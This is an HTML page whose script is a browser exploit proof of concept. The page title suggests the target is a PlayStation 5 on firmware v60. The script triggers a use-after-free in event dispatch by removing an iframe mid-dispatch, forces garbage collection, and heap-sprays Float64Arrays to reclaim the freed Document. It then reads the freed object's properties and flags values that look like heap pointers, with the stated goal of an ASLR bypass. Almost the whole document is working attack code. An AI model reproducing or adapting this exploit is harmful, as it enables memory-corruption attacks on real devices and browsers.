<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS5 v60 - EventTarget UAF Info Leak</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            padding: 20px;
            line-height: 1.5;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
        }

        h1 {
            font-size: 20px;
            margin-bottom: 10px;
            color: #ff00ff;
            font-weight: bold;
        }

        .description {
            color: #00ffff;
            margin-bottom: 20px;
            font-size: 14px;
        }

        button {
            display: block;
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            font-size: 16px;
            background: #111;
            color: #00ff41;
            border: 1px solid #00ff41;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            transition: all 0.2s;
        }

        button:hover {
            background: #00ff41;
            color: #0a0a0a;
        }

        button:active {
            transform: scale(0.98);
        }

        .output {
            background: #000;
            border: 1px solid #00ff41;
            padding: 15px;
            margin-top: 20px;
            border-radius: 4px;
            max-height: 500px;
            overflow-y: auto;
            font-size: 12px;
        }

        .output-line {
            margin: 2px 0;
            white-space: pre-wrap;
            word-break: break-all;
        }

        /* color classes */
        .ok { color: #00ff41; }
        .err { color: #ff3333; }
        .warn { color: #ffcc00; }
        .highlight { color: #00ffff; }
        .critical { color: #ff00ff; font-weight: bold; }
        .dim { color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>EventTarget UAF — Third Listener Info Leak</h1>
        <p class="description">
            Triggers a use-after-free in the event dispatch system by freeing the Document
            mid-dispatch. The third listener executes after the throw, attempting to read
            properties of a freed object. If we see corrupted or unusual values, we have a leak.
        </p>

        <button onclick="runExploit()">Trigger UAF + Third Listener Read</button>

        <div class="output" id="output"></div>
    </div>

    <script>
        // ============================================================
        // logging system — single DOM update, batched output
        // ============================================================

        const outputEl = document.getElementById('output');
        let logBuffer = [];

        function log(message, styleClass = '') {
            const lineEl = document.createElement('div');
            lineEl.className = `output-line ${styleClass}`;
            lineEl.textContent = message;
            outputEl.appendChild(lineEl);
            outputEl.scrollTop = outputEl.scrollHeight;
        }

        function logSection(title, styleClass = '') {
            log('', '');
            log(title, styleClass);
        }

        // ============================================================
        // UAF trigger and property reader
        // ============================================================

        function runExploit() {
            outputEl.innerHTML = '';
            log('=== EventTarget UAF — Third Listener Info Leak ===', 'critical');
            log('');

            try {
                // setup: create iframe and nested divs
                const iframe = document.body.appendChild(document.createElement('iframe'));
                const outerDiv = document.createElement('div');
                const innerDiv = outerDiv.appendChild(document.createElement('div'));

                log('[*] Setup: iframe created, document URL: ' + iframe.contentDocument.URL);

                // ============================================================
                // LISTENER 1: trigger GC and heap spray
                // frees the Document and attempts to reclaim its memory slot
                // ============================================================

                outerDiv.addEventListener('exploit-event', function listener1() {
                    log('[L1] Adopting node and removing iframe...');
                    document.adoptNode(outerDiv);
                    iframe.remove();

                    // GC pressure: allocate large buffers to force collection
                    log('[L1] Forcing GC (32MB allocation)...');
                    const gcBuffers = [];
                    for (let i = 0; i < 8; i++) {
                        const chunk = [];
                        for (let j = 0; j < 256; j++) {
                            chunk.push(new ArrayBuffer(65536));
                        }
                        gcBuffers.push(chunk);
                    }

                    // heap spray: Float64Array with predictable pattern
                    // goal: reclaim the freed Document slot with controlled data
                    log('[L1] Spraying Float64Arrays to reclaim freed memory...');
                    const spray = [];
                    for (let i = 0; i < 1000; i++) {
                        const buf = new ArrayBuffer(256);
                        const f64 = new Float64Array(buf);
                        // marker pattern: detect if spray landed
                        f64[0] = 1.1;
                        f64[1] = 2.2;
                        f64[2] = 3.3;
                        f64[3] = 4.4;
                        spray.push(f64);
                    }
                    log('[L1] Spray: 1000 Float64Arrays allocated');

                    // throw to continue event dispatch to next listeners
                    // this completes L1 and triggers L2
                    throw {
                        line: 1,
                        column: 1,
                        sourceURL: 'X'.repeat(1024 * 1024)
                    };
                });

                // ============================================================
                // LISTENER 2: buffer (catches throw, dispatch continues)
                // ============================================================

                outerDiv.addEventListener('exploit-event', function listener2() {
                    log('[L2] Buffer listener: exception caught, dispatch continues');
                });

                // ============================================================
                // LISTENER 3: read freed Document
                // executes after throw. Document should be freed; we read via iframe.contentDocument
                // ============================================================

                outerDiv.addEventListener('exploit-event', function listener3() {
                    logSection('[L3] Third listener executing — reading freed Document...', 'highlight');

                    let doc = null;
                    let results = [];

                    // attempt to access the potentially freed Document
                    try {
                        doc = iframe.contentDocument;
                        if (doc) {
                            log('[L3] iframe.contentDocument returned an object', 'highlight');
                        } else {
                            log('[L3] iframe.contentDocument is null (expected after removal)', 'dim');
                        }
                    } catch (e) {
                        log('[L3] iframe.contentDocument access threw: ' + e.message, 'err');
                    }

                    if (doc) {
                        readDocumentProperties(doc, results);
                    } else {
                        log('[L3] No document object, attempting fallback access...', 'warn');
                        attemptFallbackAccess(iframe);
                    }

                    // summary and leak detection
                    logSection('[L3] Results', 'critical');
                    const unusualCount = results.filter(r => r.unusual).length;
                    log('Properties checked: ' + results.length);
                    log('Unusual values: ' + unusualCount, unusualCount > 0 ? 'highlight' : 'dim');

                    if (unusualCount > 0) {
                        log('', '');
                        log('★ INFO LEAK DETECTED ★', 'critical');
                        log('Unusual values may contain heap pointers / ASLR bypass', 'highlight');
                    } else {
                        log('', '');
                        log('No unusual values. Document may not have freed, or spray missed.', 'warn');
                    }

                    log('=== Test Complete ===', 'critical');
                });

                // dispatch event, triggering all three listeners in order
                log('[*] Dispatching event...');
                log('');
                innerDiv.dispatchEvent(new Event('exploit-event', { bubbles: true }));

                // if we reach here, browser survived
                log('[+] Browser survived (no crash)', 'ok');

            } catch (e) {
                log('[!] Outer exception: ' + e.message, 'err');
                if (e.stack) log('Stack: ' + e.stack, 'err');
            }
        }

        // ============================================================
        // property reader: check Document properties for anomalies
        // ============================================================

        function readDocumentProperties(doc, results) {
            const props = [
                'nodeType', 'nodeName', 'URL', 'title', 'domain',
                'referrer', 'cookie', 'readyState', 'compatMode',
                'characterSet', 'contentType', 'documentElement',
                'head', 'body', 'images', 'links', 'forms', 'scripts',
                'styleSheets', 'fonts', 'implementation', 'location',
                'defaultView', 'activeElement', 'currentScript',
                'visibilityState', 'hidden', 'fullscreenEnabled',
                'childElementCount', 'firstElementChild', 'lastElementChild'
            ];

            logSection('[L3] Property scan:', 'highlight');

            for (let i = 0; i < props.length; i++) {
                const prop = props[i];
                try {
                    const val = doc[prop];
                    const str = String(val);
                    const unusual = detectAnomaly(prop, val, str);

                    const prefix = unusual ? '[+]' : '[-]';
                    const style = unusual ? 'highlight' : 'dim';
                    log(`  ${prefix} ${prop} = ${str}`, style);

                    results.push({ prop, value: val, unusual });

                } catch (e) {
                    log(`  [!] ${prop} access error: ${e.message}`, 'err');
                    results.push({ prop, error: e.message, unusual: false });
                }
            }

            // attempt Object introspection
            logSection('[L3] Object introspection:', 'highlight');

            const introspectionMethods = [
                { name: 'toString', fn: () => doc.toString() },
                { name: 'constructor', fn: () => String(doc.constructor) },
                { name: 'Object.keys', fn: () => Object.keys(doc).join(', ') },
                { name: 'Object.getOwnPropertyNames', fn: () => Object.getOwnPropertyNames(doc).join(', ') },
                { name: 'Object.getPrototypeOf', fn: () => String(Object.getPrototypeOf(doc)) },
                { name: 'Reflect.ownKeys', fn: () => Reflect.ownKeys(doc).join(', ') }
            ];

            for (const method of introspectionMethods) {
                try {
                    const result = method.fn();
                    log(`  ${method.name}: ${result}`, 'dim');
                } catch (e) {
                    log(`  ${method.name} error: ${e.message}`, 'err');
                }
            }
        }

        // ============================================================
        // anomaly detection: identify unusual values
        // ============================================================

        function detectAnomaly(prop, val, str) {
            // large numbers might be pointers
            if (typeof val === 'number' && val > 0x10000) {
                return true;
            }

            // hex-like patterns in strings (excluding known-good patterns)
            if (/[0-9a-f]{8,}/i.test(str) && str !== '[object HTMLDocument]') {
                return true;
            }

            // property-specific defaults: if it doesn't match, something's wrong
            const expectedDefaults = {
                'nodeType': 9,              // DOCUMENT_NODE
                'URL': 'about:blank',
                'readyState': 'complete',
                'characterSet': 'UTF-8',
                'contentType': 'text/html'
            };

            if (prop in expectedDefaults && val !== expectedDefaults[prop]) {
                return true;
            }

            return false;
        }

        // ============================================================
        // fallback: try alternate access methods if document is null
        // ============================================================

        function attemptFallbackAccess(iframe) {
            try {
                log('  iframe.tagName: ' + iframe.tagName, 'dim');
                log('  iframe.parentNode: ' + (iframe.parentNode ? iframe.parentNode.nodeName : 'null'), 'dim');
                log('  iframe.contentWindow: ' + String(iframe.contentWindow), 'dim');
            } catch (e) {
                log('  Fallback access error: ' + e.message, 'err');
            }
        }
    </script>
</body>
</html>
